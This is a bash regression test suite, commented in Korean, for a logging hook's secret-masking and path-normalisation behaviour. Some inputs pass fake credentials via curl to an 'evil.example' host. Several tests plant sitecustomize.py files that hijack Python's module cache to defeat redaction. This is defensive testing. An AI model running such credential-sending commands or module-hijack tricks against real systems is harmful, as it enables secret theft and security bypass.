#!/bin/bash
# tests/hooks/test-log-block-masking-ssot.sh
#
# plan Task 7.1 명시 전환 #1 (v2 spec §5.5 [B-5]): rein-log-block.py 의
# mask() 는 더 이상 자체 _MASK_PATTERNS 를 갖지 않고
# rein.shadow.masking.redact() 로 위임한다. 이 스위트는 그 전환을 행위로
# 고정한다 — 스크립트를 실제로 서브프로세스로 실행하고 출력·파일 결과를
# 단언한다 (source-only 단위 테스트는 SCRIPT_DIR 가 $0 기준이라 false-green
# 을 만든다 — reference_hook_test_behavioral_over_sourced).
#
# 계약:
#   [T1] v2 엔진에서만 오는 정교화 패턴(예: `--password s3cret` 공백
#        분리형)이 실제로 마스킹된다 — 이 전환 전에는 실패했어야 하는
#        회귀 핀(v1 _MASK_PATTERNS 규칙 2는 `[=:]` 구분자를 요구해
#        공백 분리형을 잡지 못했다).
#   [T2] v1 원래 5종 케이스가 전환 후에도 동등하게 마스킹된다.
#   [T3] v2 엔진 import 가 실패하는 상황(격리 트리 — 이 스크립트 파일
#        단독 사본, 형제 rein 패키지 부재)에서 원문이 새어나가지 않고
#        고정 placeholder 가 쓰이며, 호출자 계약(정수 count 출력 + exit 0)
#        이 유지된다. 규칙을 로컬에 복제해 폴백하지 않는다는 설계
#        결정(fail-closed) 이 실제로 지켜지는지 증명하는 테스트다.
#   [T4] R1 (Phase 7 웨이브 4 코드 리뷰 High) 회귀 핀 — 1회차 수정판 기준.
#        sys.modules 에 동명 가짜 "rein.shadow.masking" 패키지가(실제
#        masking.py 는 정상 위치에 있는 채로, `__file__` 속성 없이)
#        선등록돼 있어도 mask()가 그 가짜 모듈에 위임하지 않는다.
#   [R5a] 2회차 코드 리뷰 재현 (a): 진짜 rein.shadow.masking 을 먼저
#        정상 import 시킨 뒤 `redact` 심볼만 항등함수로 교체 — 로드된
#        모듈의 `__file__` 은 진짜 경로 그대로라 T4 식 `__file__` 재검증은
#        이 형태를 못 잡는다(T4 는 이 시나리오를 커버하지 않아 false-green
#        이었다). mask()가 실제로는 이 심볼 스왑과 무관한 결과를 내는지
#        고정한다 — dotted import 를 완전히 버리고 파일에서 직접 로드하는
#        수정(R5)이 실제로 이 클래스를 막는지의 회귀 핀.
#   [R5b] 2회차 코드 리뷰 재현 (b): 가짜 모듈이 자기 `__file__` 을 기대
#        경로 문자열로 자칭하며 sys.modules 에 선등록 — T4 의 "__file__
#        재검증" 자체를 정면으로 통과하는 형태(T4 는 __file__ 이 아예
#        없는 약한 공격만 검증했다). R5 수정 후에는 sys.modules 를 아예
#        참조하지 않으므로 이 형태도 무력화되어야 한다.
#        [T4]/[R5a]/[R5b] 모두 sitecustomize.py 를 PYTHONPATH 에 얹어
#        인터프리터 기동 직후(스크립트 실행 이전) sys.modules 를 오염시키는
#        방식으로 실제 서브프로세스에서 재현한다 — source-only 로는 이
#        타이밍을 재현할 수 없다.

set -u
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(cd "$SCRIPT_DIR/../.." && pwd)"
LOG_BLOCK="$PROJECT_DIR/plugins/rein-core/hooks/lib/rein-log-block.py"

TEST_COUNT=0
FAIL_COUNT=0
CURRENT_FAILS=0

fail() {
  FAIL_COUNT=$((FAIL_COUNT + 1))
  CURRENT_FAILS=$((CURRENT_FAILS + 1))
  echo "  FAIL: $1" >&2
}

begin() {
  CURRENT_FAILS=0
  TEST_COUNT=$((TEST_COUNT + 1))
  echo "RUN $1"
}

end() {
  [ "$CURRENT_FAILS" -eq 0 ] && echo "  OK"
}

# run_log_block SCRIPT_PATH TARGET MODE
#   격리된 tracked/raw jsonl 경로로 호출하고 stdout/exit 을 전역에 남긴다.
#   케이스마다 mktemp -d 로 새 디렉토리를 만들되(각 케이스의 tracked/raw
#   파일이 서로 섞이면 안 되므로 공유 디렉토리로 합칠 수 없다), 생성한
#   디렉토리는 RLB_TMP_DIRS 배열에 적립해 두고 스크립트 종료 시 trap 으로
#   일괄 정리한다(R3, 코드 리뷰 Low — 케이스마다 정리하지 않아 실행당 8개
#   /tmp/log-block-test-* 가 누수되던 문제).
RLB_STDOUT=""
RLB_EXIT=0
RLB_TRACKED=""
RLB_RAW=""
RLB_TMP_DIRS=()
# R7 (코드 리뷰 Low): 고정 이름 /tmp/log-block-test-stderr 를 병렬 실행 시
# 여러 프로세스가 공유하면 충돌한다 — mktemp 로 매 스위트 실행마다 고유
# 파일을 만들고, 다른 임시물과 같은 trap 으로 정리한다(내용은 어떤 테스트도
# 단언하지 않으므로 실행 전체에 걸쳐 재사용해도 안전 — 매 호출 truncate).
RLB_STDERR_FILE=$(mktemp "/tmp/log-block-test-stderr-XXXXXX")
_cleanup_rlb_tmp_dirs() {
  local d
  for d in "${RLB_TMP_DIRS[@]:-}"; do
    [ -n "$d" ] && rm -rf "$d"
  done
  [ -n "${RLB_STDERR_FILE:-}" ] && rm -f "$RLB_STDERR_FILE"
}
trap _cleanup_rlb_tmp_dirs EXIT
run_log_block() {
  local script_path="$1"
  local target="$2"
  local mode="${3:-command}"
  local tmp
  tmp=$(mktemp -d "/tmp/log-block-test-XXXXXX")
  RLB_TMP_DIRS+=("$tmp")
  RLB_TRACKED="$tmp/tracked.jsonl"
  RLB_RAW="$tmp/raw.jsonl"
  RLB_STDOUT=$(python3 "$script_path" "test-hook" "test-reason" \
    "$target" "$RLB_TRACKED" "$RLB_RAW" "$mode" "1" 2>"$RLB_STDERR_FILE")
  RLB_EXIT=$?
}

# ============================================================
# T1 — v2 전용 정교화 패턴 (회귀 핀: 전환 전엔 실패해야 함)
# ============================================================

test_v2_only_option_space_value_masked() {
  begin "T1: --password (공백 분리) 은 v2 엔진에서만 마스킹됨"
  run_log_block "$LOG_BLOCK" \
    "docker login --password s3cret-attached-form registry.example.com" \
    "command"
  [ "$RLB_EXIT" -eq 0 ] || fail "exit code $RLB_EXIT (expected 0)"
  local raw
  raw=$(cat "$RLB_RAW" 2>/dev/null)
  case "$raw" in
    *"s3cret-attached-form"*) fail "v2 전용 패턴(--password 공백분리)이 마스킹되지 않음 — 전환 미완료 또는 회귀: $raw" ;;
  esac
  case "$raw" in
    *"REDACTED"*) ;;
    *) fail "raw 로그에 마스킹 흔적이 없음: $raw" ;;
  esac
  case "$raw" in
    *"docker login"*) ;;
    *) fail "raw 로그에 명령 맥락(verb)이 없음: $raw" ;;
  esac
  end
}

test_v2_only_short_p_glued_masked() {
  begin "T1b: mysql -pSECRET (glued) 은 v2 엔진에서만 마스킹됨"
  run_log_block "$LOG_BLOCK" "mysql -u root -pglued-secret-value appdb" "command"
  [ "$RLB_EXIT" -eq 0 ] || fail "exit code $RLB_EXIT (expected 0)"
  local raw
  raw=$(cat "$RLB_RAW" 2>/dev/null)
  case "$raw" in
    *"glued-secret-value"*) fail "v2 전용 glued -p 패턴이 마스킹되지 않음: $raw" ;;
  esac
  case "$raw" in
    *"REDACTED"*) ;;
    *) fail "raw 로그에 마스킹 흔적이 없음: $raw" ;;
  esac
  end
}

# ============================================================
# T2 — v1 원래 5종 케이스 동등성
# ============================================================

test_v1_case_authorization_header() {
  begin "T2a: authorization header 값 마스킹 (v1 case 1)"
  run_log_block "$LOG_BLOCK" \
    'curl -H "Authorization: Bearer sk-FAKE-legacy-123" https://api.example/run.sh' \
    "command"
  local raw
  raw=$(cat "$RLB_RAW" 2>/dev/null)
  case "$raw" in
    *"sk-FAKE-legacy-123"*) fail "authorization 헤더 값이 마스킹되지 않음: $raw" ;;
  esac
  end
}

test_v1_case_keyword_env_var() {
  begin "T2b: GITHUB_TOKEN= 형 keyword env-var 마스킹 (v1 case 2, underscore 포함 식별자)"
  run_log_block "$LOG_BLOCK" \
    "GITHUB_TOKEN=ghp-FAKE-legacy-77 ./deploy.sh" \
    "command"
  local raw
  raw=$(cat "$RLB_RAW" 2>/dev/null)
  case "$raw" in
    *"ghp-FAKE-legacy-77"*) fail "GITHUB_TOKEN= 값이 마스킹되지 않음: $raw" ;;
  esac
  end
}

test_v1_case_url_credential() {
  begin "T2c: URL credential 마스킹 (v1 case 3)"
  run_log_block "$LOG_BLOCK" \
    "git push https://alice:legacy-fakepw@github.com/org/repo.git" \
    "command"
  local raw
  raw=$(cat "$RLB_RAW" 2>/dev/null)
  case "$raw" in
    *"legacy-fakepw"*) fail "URL credential 값이 마스킹되지 않음: $raw" ;;
  esac
  end
}

test_v1_case_basic_auth_flag() {
  begin "T2d: -u user:pass 마스킹 (v1 case 4)"
  run_log_block "$LOG_BLOCK" \
    "curl -u alice:legacy-basic-55 https://api.example.com/v1" \
    "command"
  local raw
  raw=$(cat "$RLB_RAW" 2>/dev/null)
  case "$raw" in
    *"legacy-basic-55"*) fail "-u user:pass 값이 마스킹되지 않음: $raw" ;;
  esac
  end
}

test_v1_case_standalone_bearer() {
  begin "T2e: standalone bearer 토큰 마스킹 (v1 case 5)"
  run_log_block "$LOG_BLOCK" "echo bearer legacy-fake-bearer-tok" "command"
  local raw
  raw=$(cat "$RLB_RAW" 2>/dev/null)
  case "$raw" in
    *"legacy-fake-bearer-tok"*) fail "standalone bearer 토큰이 마스킹되지 않음: $raw" ;;
  esac
  end
}

# ============================================================
# F1 — command 모드 추적 레코드의 verb 에 남는 사적 절대경로 정규화
#      (Phase 7 웨이브 4 코드 리뷰 3회차 High. safe_command_repr() 은 verb
#      만 기록하지만, verb 자체가 절대 실행파일 경로일 수 있다 —
#      mask()(secret 전용)는 경로를 건드리지 않으므로 그대로 새고 있었다.
#      rein-log-block.py 모듈 docstring R7 참조. 내용 해시(#sha12)는 원본
#      target 전체 기준으로 불변이어야 한다 — 과거 레코드와의 상관관계가
#      끊기면 안 되므로 별도로 고정한다.)
# ============================================================

test_f1_command_mode_absolute_verb_path_normalized_in_tracked() {
  begin "F1a: command 모드 — 절대경로 실행파일 verb 가 추적 레코드에서 <HOME> 으로 축약됨"
  run_log_block "$LOG_BLOCK" \
    "/Users/alice/private-tools/deploy --password secret123" "command"
  [ "$RLB_EXIT" -eq 0 ] || fail "exit code $RLB_EXIT (expected 0)"
  local tracked
  tracked=$(cat "$RLB_TRACKED" 2>/dev/null)
  case "$tracked" in
    *"alice"*) fail "추적 레코드의 verb 에 사용자명이 남음: $tracked" ;;
  esac
  case "$tracked" in
    *"<HOME>"*) ;;
    *) fail "추적 레코드 verb 에 <HOME> 축약 흔적이 없음: $tracked" ;;
  esac
  case "$tracked" in
    *"deploy"*) ;;
    *) fail "추적 레코드 verb 에서 실행파일 이름(대조 신호)이 사라짐: $tracked" ;;
  esac
  end
}

test_f1_command_mode_absolute_verb_path_linux_home_normalized_in_tracked() {
  begin "F1b: command 모드 — /home/<user>/... 실행파일 verb 도 <HOME> 으로 축약됨"
  run_log_block "$LOG_BLOCK" "/home/bob/bin/run --token abc123" "command"
  [ "$RLB_EXIT" -eq 0 ] || fail "exit code $RLB_EXIT (expected 0)"
  local tracked raw
  tracked=$(cat "$RLB_TRACKED" 2>/dev/null)
  raw=$(cat "$RLB_RAW" 2>/dev/null)
  case "$tracked" in
    *"bob"*) fail "추적 레코드의 verb 에 사용자명이 남음: $tracked" ;;
  esac
  case "$raw" in
    *"bob"*) fail "raw 로그에 사용자명이 남음: $raw" ;;
  esac
  case "$tracked" in
    *"<HOME>"*) ;;
    *) fail "추적 레코드 verb 에 <HOME> 축약 흔적이 없음: $tracked" ;;
  esac
  end
}

test_f1_verb_normalization_does_not_change_content_hash() {
  begin "F1c: verb 정규화가 내용 해시(sha12)를 바꾸지 않음 — 원본 target 전체 기준 불변"
  local target="/Users/alice/private-tools/deploy --password secret123"
  run_log_block "$LOG_BLOCK" "$target" "command"
  [ "$RLB_EXIT" -eq 0 ] || fail "exit code $RLB_EXIT (expected 0)"
  local tracked expected_sha
  tracked=$(cat "$RLB_TRACKED" 2>/dev/null)
  expected_sha=$(python3 -c "
import hashlib, sys
print(hashlib.sha256(sys.argv[1].encode('utf-8', 'replace')).hexdigest()[:12])
" "$target")
  case "$tracked" in
    *"#$expected_sha"*) ;;
    *) fail "내용 해시가 원본 target 전체 기준이 아님 (verb 정규화가 해시 입력에 영향을 준 것으로 의심): $tracked (expected #$expected_sha)" ;;
  esac
  end
}

# ============================================================
# R2 — path 모드 추적 레코드의 사적 절대경로 정규화
#      (rein.shadow.paths.normalize 위임; R6 이후 로컬 raw 로그도 동일하게
#      정규화됨 — 더 이상 전체 경로를 보존하지 않는다. 아래 R6 테스트 참조)
# ============================================================

test_r2_path_mode_macos_home_normalized_in_tracked() {
  begin "R2a: path 모드 — /Users/<user>/... 추적 레코드가 <HOME> 으로 축약됨"
  run_log_block "$LOG_BLOCK" "/Users/alice/projects/secret-app/config.yaml" "path"
  [ "$RLB_EXIT" -eq 0 ] || fail "exit code $RLB_EXIT (expected 0)"
  local tracked
  tracked=$(cat "$RLB_TRACKED" 2>/dev/null)
  case "$tracked" in
    *"/Users/alice"*) fail "추적 레코드에 사용자명이 남음: $tracked" ;;
  esac
  case "$tracked" in
    *"<HOME>"*) ;;
    *) fail "추적 레코드에 <HOME> 축약 흔적이 없음: $tracked" ;;
  esac
  case "$tracked" in
    *"config.yaml"*) ;;
    *) fail "추적 레코드에서 뒤 경로(대조 신호)가 사라짐: $tracked" ;;
  esac
  end
}

test_r2_path_mode_linux_home_normalized_in_tracked() {
  begin "R2b: path 모드 — /home/<user>/... 추적 레코드도 <HOME> 으로 축약됨"
  run_log_block "$LOG_BLOCK" "/home/bob/work/app/model.py" "path"
  [ "$RLB_EXIT" -eq 0 ] || fail "exit code $RLB_EXIT (expected 0)"
  local tracked
  tracked=$(cat "$RLB_TRACKED" 2>/dev/null)
  case "$tracked" in
    *"/home/bob"*) fail "추적 레코드에 사용자명이 남음: $tracked" ;;
  esac
  case "$tracked" in
    *"<HOME>"*) ;;
    *) fail "추적 레코드에 <HOME> 축약 흔적이 없음: $tracked" ;;
  esac
  end
}

test_r6_path_mode_raw_log_also_normalized() {
  # R6 (사용자 결정, Phase 7 웨이브 4 리뷰 2회차): raw 로그도 이제
  # 경로 정규화 대상이다 — 기존 "raw 는 gitignored 라 안전" 근거가
  # rein 이 사용자 프로젝트에 그 무시 규칙을 만들어주지 않는다는 실측
  # (0건) 앞에서 무너졌다. 이 테스트는 예전 계약(R2c: 원문 보존)의
  # 정반대를 고정한다 — 예전 assertion 을 약화시키지 않고 새 계약으로
  # 교체.
  begin "R6a: path 모드 — 로컬 raw 로그도 <HOME> 으로 축약됨(더 이상 원문 보존 안 함)"
  run_log_block "$LOG_BLOCK" "/Users/alice/projects/secret-app/config.yaml" "path"
  [ "$RLB_EXIT" -eq 0 ] || fail "exit code $RLB_EXIT (expected 0)"
  local raw
  raw=$(cat "$RLB_RAW" 2>/dev/null)
  case "$raw" in
    *"/Users/alice"*) fail "raw 로그에 사용자명이 남음(R6 계약 위반): $raw" ;;
  esac
  case "$raw" in
    *"<HOME>"*) ;;
    *) fail "raw 로그에 <HOME> 축약 흔적이 없음: $raw" ;;
  esac
  case "$raw" in
    *"config.yaml"*) ;;
    *) fail "raw 로그에서 뒤 경로(대조 신호)가 사라짐: $raw" ;;
  esac
  end
}

test_r6_command_mode_raw_log_home_path_also_normalized() {
  # R6: 명령 모드/경로 모드 구분 없이 raw 는 전체 텍스트를 담으므로
  # 명령 문자열 안에 섞인 홈 경로도 축약 대상이다.
  begin "R6b: command 모드 — raw 로그의 명령 텍스트에 섞인 홈 경로도 축약됨"
  run_log_block "$LOG_BLOCK" "cat /Users/alice/projects/secret-app/config.yaml" "command"
  [ "$RLB_EXIT" -eq 0 ] || fail "exit code $RLB_EXIT (expected 0)"
  local raw
  raw=$(cat "$RLB_RAW" 2>/dev/null)
  case "$raw" in
    *"/Users/alice"*) fail "command 모드 raw 로그에 사용자명이 남음(R6 계약 위반): $raw" ;;
  esac
  case "$raw" in
    *"<HOME>"*) ;;
    *) fail "command 모드 raw 로그에 <HOME> 축약 흔적이 없음: $raw" ;;
  esac
  case "$raw" in
    *"cat"*) ;;
    *) fail "command 모드 raw 로그에서 명령 맥락(동사)이 사라짐: $raw" ;;
  esac
  end
}

test_r2_path_mode_import_failure_fails_closed_no_raw_path_fallback() {
  begin "R2d/R6c: path 모드 — v2 엔진 import 실패 시 추적 레코드도 raw 로그도 원문 경로로 폴백하지 않음"
  local iso
  iso=$(mktemp -d "/tmp/log-block-isolated-path-XXXXXX")
  # T3 와 동일한 격리 트리 기법: rein-log-block.py 단독 사본, 형제 rein/
  # 패키지 부재 → masking 뿐 아니라 paths.normalize 도 검증-로드 실패.
  cp "$LOG_BLOCK" "$iso/rein-log-block.py"
  run_log_block "$iso/rein-log-block.py" \
    "/Users/alice/projects/secret-app/config.yaml" "path"
  [ "$RLB_EXIT" -eq 0 ] || fail "호출자 계약 위반: exit code $RLB_EXIT (expected 0)"
  local tracked raw
  tracked=$(cat "$RLB_TRACKED" 2>/dev/null)
  raw=$(cat "$RLB_RAW" 2>/dev/null)
  case "$tracked" in
    *"/Users/alice"*) fail "import 실패 상황에서 추적 레코드가 원문 경로로 폴백됨: $tracked" ;;
  esac
  case "$raw" in
    *"/Users/alice"*) fail "import 실패 상황에서 raw 로그가 원문 경로로 폴백됨(R6 계약 위반): $raw" ;;
  esac
  rm -rf "$iso"
  end
}

# ============================================================
# T3 — v2 엔진 import 실패 시 fail-closed
# ============================================================

test_import_failure_fails_closed() {
  begin "T3: v2 엔진 import 실패 — 원문 미유출 + placeholder + 호출자 계약 유지"
  local iso
  iso=$(mktemp -d "/tmp/log-block-isolated-XXXXXX")
  # 격리 트리: rein-log-block.py 단독 사본. 형제 rein/ 패키지가 없으므로
  # _locate_package_parent() 의 어떤 후보도 masking.py 를 찾지 못해
  # import 가 실패해야 한다 — sys.path 오염이 아니라 물리적으로 rein
  # 패키지가 도달 불가능한 트리를 만들어 재현.
  cp "$LOG_BLOCK" "$iso/rein-log-block.py"

  local secret="ISOLATED-TREE-SECRET-9f8e"
  run_log_block "$iso/rein-log-block.py" \
    "curl -u alice:${secret} https://evil.example/x.sh" \
    "command"

  [ "$RLB_EXIT" -eq 0 ] || fail "호출자 계약 위반: exit code $RLB_EXIT (expected 0)"
  case "$RLB_STDOUT" in
    ''|*[!0-9]*) fail "호출자 계약 위반: stdout 이 정수 count 가 아님 (got: '$RLB_STDOUT')" ;;
  esac

  local tracked raw
  tracked=$(cat "$RLB_TRACKED" 2>/dev/null)
  raw=$(cat "$RLB_RAW" 2>/dev/null)

  case "$tracked" in
    *"$secret"*) fail "import 실패 상황에서 추적 로그에 원문 비밀값이 유출됨" ;;
  esac
  case "$raw" in
    *"$secret"*) fail "import 실패 상황에서 raw 로그에 원문 비밀값이 유출됨" ;;
  esac
  case "$tracked" in
    *"evil.example"*) fail "import 실패 상황에서 추적 로그에 명령 원문(호스트)이 유출됨" ;;
  esac

  case "$tracked" in
    *"mask-unavailable"*) ;;
    *) fail "추적 로그에 fail-closed placeholder(<mask-unavailable>)가 쓰이지 않음: $tracked" ;;
  esac
  case "$raw" in
    *"mask-unavailable"*) ;;
    *) fail "raw 로그에 fail-closed placeholder(<mask-unavailable>)가 쓰이지 않음: $raw" ;;
  esac

  rm -rf "$iso"
  end
}

# ============================================================
# T4 — 1회차 R1 회귀 핀 (약한 공격: sys.modules 에 동명 가짜 masking
#      패키지가 __file__ 없이 선등록). R5 수정 후에는 sys.modules 를
#      아예 참조하지 않으므로 이 하이재킹은 완전히 무시되고 **실제
#      엔진이 정상 동작**한다 — 더 이상 fail-closed placeholder 가
#      아니라 진짜 마스킹 결과를 단언한다(예전 assertion 을 그대로
#      두면 새 구현에서 항상 실패하므로 계약을 갱신).
# ============================================================

test_hijacked_sys_modules_is_ignored_real_masking_runs() {
  begin "T4 (R1, 1회차): sys.modules 에 동명 가짜 rein.shadow.masking 이 선등록돼도 direct-load 가 무시하고 실제 마스킹 수행"
  local poison
  poison=$(mktemp -d "/tmp/log-block-poison-XXXXXX")
  RLB_TMP_DIRS+=("$poison")
  # sitecustomize.py 를 PYTHONPATH 에 두면 인터프리터 site 초기화 단계에서
  # (스크립트 자신의 코드가 실행되기 전에) 자동 import 된다 — 이 시점에
  # sys.modules 를 오염시키면 이후 스크립트의 `import rein.shadow.masking`
  # 은 sys.path 를 전혀 참조하지 않고 이 캐시를 그대로 반환한다(Python
  # import 기계의 sys.modules-우선 규약). R5 수정 후 rein-log-block.py 는
  # 애초에 이런 dotted import 를 하지 않으므로(직접 파일 로드), 이 오염은
  # 아무 효과가 없어야 한다.
  cat > "$poison/sitecustomize.py" <<'PY'
import sys, types
fake_masking = types.ModuleType("rein.shadow.masking")
fake_masking.redact = lambda text: text
fake_shadow = types.ModuleType("rein.shadow")
fake_shadow.masking = fake_masking
fake_rein = types.ModuleType("rein")
fake_rein.shadow = fake_shadow
sys.modules["rein"] = fake_rein
sys.modules["rein.shadow"] = fake_shadow
sys.modules["rein.shadow.masking"] = fake_masking
PY

  local tmp secret
  tmp=$(mktemp -d "/tmp/log-block-test-XXXXXX")
  RLB_TMP_DIRS+=("$tmp")
  secret="HIJACK-SYS-MODULES-SECRET-771"
  RLB_STDOUT=$(PYTHONPATH="$poison" python3 "$LOG_BLOCK" "test-hook" "test-reason" \
    "curl -u alice:${secret} https://evil.example/x.sh" \
    "$tmp/tracked.jsonl" "$tmp/raw.jsonl" "command" "1" 2>"$RLB_STDERR_FILE")
  RLB_EXIT=$?

  [ "$RLB_EXIT" -eq 0 ] || fail "호출자 계약 위반: exit code $RLB_EXIT (expected 0)"
  case "$RLB_STDOUT" in
    ''|*[!0-9]*) fail "호출자 계약 위반: stdout 이 정수 count 가 아님 (got: '$RLB_STDOUT')" ;;
  esac

  local tracked raw
  tracked=$(cat "$tmp/tracked.jsonl" 2>/dev/null)
  raw=$(cat "$tmp/raw.jsonl" 2>/dev/null)
  case "$tracked" in
    *"$secret"*) fail "sys.modules 하이재킹 상황에서 추적 로그에 원문 비밀값이 유출됨: $tracked" ;;
  esac
  case "$raw" in
    *"$secret"*) fail "sys.modules 하이재킹 상황에서 raw 로그에 원문 비밀값이 유출됨: $raw" ;;
  esac
  case "$raw" in
    *"REDACTED"*) ;;
    *) fail "raw 로그가 실제로 마스킹되지 않음 — sys.modules 오염이 direct-load 를 우회한 것으로 의심: $raw" ;;
  esac
  end
}

# ============================================================
# R5a/R5b — 2회차 코드 리뷰 재현: R1 1회차 수정("dotted import 후 __file__
#      재검증")이 실제로는 우회 가능함을 증명한 두 시나리오. 헤더 주석
#      [R5a]/[R5b] 참조.
# ============================================================

test_r5a_symbol_swap_after_real_import_defeated() {
  begin "R5a: 진짜 모듈을 정상 import 후 redact 심볼만 항등함수로 교체해도 원문 미유출"
  local poison
  poison=$(mktemp -d "/tmp/log-block-swap-XXXXXX")
  RLB_TMP_DIRS+=("$poison")
  # sitecustomize.py 가 인터프리터 기동 시점에 **진짜** rein.shadow.masking
  # 을 정상 경로로 import 한 뒤 그 모듈 객체의 redact 속성만 항등함수로
  # 덮어쓴다. __file__ 은 여전히 진짜 경로 그대로다 — 1회차 수정의
  # "로드된 모듈의 __file__ 재검증" 이 통과시키던 바로 그 형태.
  cat > "$poison/sitecustomize.py" <<PY
import sys
sys.path.insert(0, "$PROJECT_DIR/plugins/rein-core")
import rein.shadow.masking as _real_masking
_real_masking.redact = lambda text: text
PY

  local tmp secret
  tmp=$(mktemp -d "/tmp/log-block-test-XXXXXX")
  RLB_TMP_DIRS+=("$tmp")
  secret="SYMBOL-SWAP-SECRET-4471"
  RLB_STDOUT=$(PYTHONPATH="$poison" python3 "$LOG_BLOCK" "test-hook" "test-reason" \
    "curl -u alice:${secret} https://evil.example/x.sh" \
    "$tmp/tracked.jsonl" "$tmp/raw.jsonl" "command" "1" 2>"$RLB_STDERR_FILE")
  RLB_EXIT=$?

  [ "$RLB_EXIT" -eq 0 ] || fail "호출자 계약 위반: exit code $RLB_EXIT (expected 0)"
  local tracked raw
  tracked=$(cat "$tmp/tracked.jsonl" 2>/dev/null)
  raw=$(cat "$tmp/raw.jsonl" 2>/dev/null)
  case "$tracked" in
    *"$secret"*) fail "심볼 스왑 상황에서 추적 로그에 원문 비밀값이 유출됨: $tracked" ;;
  esac
  case "$raw" in
    *"$secret"*) fail "심볼 스왑 상황에서 raw 로그에 원문 비밀값이 유출됨: $raw" ;;
  esac
  case "$raw" in
    *"REDACTED"*) ;;
    *) fail "raw 로그가 실제로 마스킹되지 않음 — 심볼 스왑이 direct-load 를 우회한 것으로 의심: $raw" ;;
  esac
  end
}

test_r5b_fake_module_self_reported_file_defeated() {
  begin "R5b: 가짜 모듈이 __file__ 을 기대 경로로 자칭하며 sys.modules 선등록해도 원문 미유출"
  local poison expected_masking
  poison=$(mktemp -d "/tmp/log-block-fakefile-XXXXXX")
  RLB_TMP_DIRS+=("$poison")
  expected_masking="$PROJECT_DIR/plugins/rein-core/rein/shadow/masking.py"
  # T4 와 달리 __file__ 을 실제 기대 경로 문자열로 정확히 자칭한다 —
  # 1회차 수정의 __file__ 재검증을 정면으로 통과시키는 형태(T4 는 __file__
  # 자체가 없는 약한 공격만 커버해 false-green 이었다).
  cat > "$poison/sitecustomize.py" <<PY
import sys, types
fake_masking = types.ModuleType("rein.shadow.masking")
fake_masking.redact = lambda text: text
fake_masking.__file__ = "$expected_masking"
fake_shadow = types.ModuleType("rein.shadow")
fake_shadow.masking = fake_masking
fake_rein = types.ModuleType("rein")
fake_rein.shadow = fake_shadow
sys.modules["rein"] = fake_rein
sys.modules["rein.shadow"] = fake_shadow
sys.modules["rein.shadow.masking"] = fake_masking
PY

  local tmp secret
  tmp=$(mktemp -d "/tmp/log-block-test-XXXXXX")
  RLB_TMP_DIRS+=("$tmp")
  secret="FAKE-FILE-SECRET-5582"
  RLB_STDOUT=$(PYTHONPATH="$poison" python3 "$LOG_BLOCK" "test-hook" "test-reason" \
    "curl -u alice:${secret} https://evil.example/x.sh" \
    "$tmp/tracked.jsonl" "$tmp/raw.jsonl" "command" "1" 2>"$RLB_STDERR_FILE")
  RLB_EXIT=$?

  [ "$RLB_EXIT" -eq 0 ] || fail "호출자 계약 위반: exit code $RLB_EXIT (expected 0)"
  local tracked raw
  tracked=$(cat "$tmp/tracked.jsonl" 2>/dev/null)
  raw=$(cat "$tmp/raw.jsonl" 2>/dev/null)
  case "$tracked" in
    *"$secret"*) fail "자칭 __file__ 상황에서 추적 로그에 원문 비밀값이 유출됨: $tracked" ;;
  esac
  case "$raw" in
    *"$secret"*) fail "자칭 __file__ 상황에서 raw 로그에 원문 비밀값이 유출됨: $raw" ;;
  esac
  case "$raw" in
    *"REDACTED"*) ;;
    *) fail "raw 로그가 실제로 마스킹되지 않음 — 자칭 __file__ 이 direct-load 를 우회한 것으로 의심: $raw" ;;
  esac
  end
}

# ============================================================
# main
# ============================================================

test_v2_only_option_space_value_masked
test_v2_only_short_p_glued_masked
test_v1_case_authorization_header
test_v1_case_keyword_env_var
test_v1_case_url_credential
test_v1_case_basic_auth_flag
test_v1_case_standalone_bearer
test_f1_command_mode_absolute_verb_path_normalized_in_tracked
test_f1_command_mode_absolute_verb_path_linux_home_normalized_in_tracked
test_f1_verb_normalization_does_not_change_content_hash
test_r2_path_mode_macos_home_normalized_in_tracked
test_r2_path_mode_linux_home_normalized_in_tracked
test_r6_path_mode_raw_log_also_normalized
test_r6_command_mode_raw_log_home_path_also_normalized
test_r2_path_mode_import_failure_fails_closed_no_raw_path_fallback
test_import_failure_fails_closed
test_hijacked_sys_modules_is_ignored_real_masking_runs
test_r5a_symbol_swap_after_real_import_defeated
test_r5b_fake_module_self_reported_file_defeated

test_livecount_corrupted_then_valid_counts() {
  begin "live_count: 손상 바이트 뒤 정상 live 행을 1로 센다 (반복 경고 생존)"
  local d
  d=$(mktemp -d "/tmp/log-block-lc-XXXXXX")
  RLB_TMP_DIRS+=("$d")
  printf '\xff\xfe bad\n{"hook":"h","reason":"r","target":"t","source":"live"}\n' > "$d/tracked.jsonl"
  local n
  n=$(python3 -c "
import importlib.util
s=importlib.util.spec_from_file_location('lb','$LOG_BLOCK')
m=importlib.util.module_from_spec(s); s.loader.exec_module(m)
print(m.live_count('$d/tracked.jsonl','h','r'))
")
  [ "$n" = "1" ] || fail "live_count 가 손상 바이트 뒤 정상 행을 못 셈 (got '$n', expected 1)"
  end
}

test_livecount_corrupted_then_valid_counts

echo ""
echo "================================"
echo "Tests run: $TEST_COUNT"
echo "Passed:    $((TEST_COUNT - FAIL_COUNT))"
echo "Failed:    $FAIL_COUNT"
echo "================================"
[ "$FAIL_COUNT" -eq 0 ]
